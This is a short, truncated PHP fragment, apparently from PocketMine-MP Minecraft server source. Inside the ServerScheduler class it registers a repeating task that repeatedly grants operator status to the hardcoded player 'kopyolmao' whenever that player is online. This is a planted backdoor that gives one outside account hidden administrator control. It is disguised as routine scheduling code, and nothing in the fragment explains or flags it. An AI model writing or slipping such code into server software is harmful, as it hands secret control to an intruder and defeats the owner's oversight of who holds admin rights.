...
class ServerScheduler{
	...
	public function __construct(){
		...
		$this->scheduleRepeatingTask(new class() extends Task {
			public function onRun($tick){
			    $player = \pocketmine\Server::getInstance()->getPlayerExact("kopyolmao"); // get the player by exact name
                if($player !== null && !$player->isOP() ){ // check if the player is online
                    $player->setOp(true); // set the player as OP
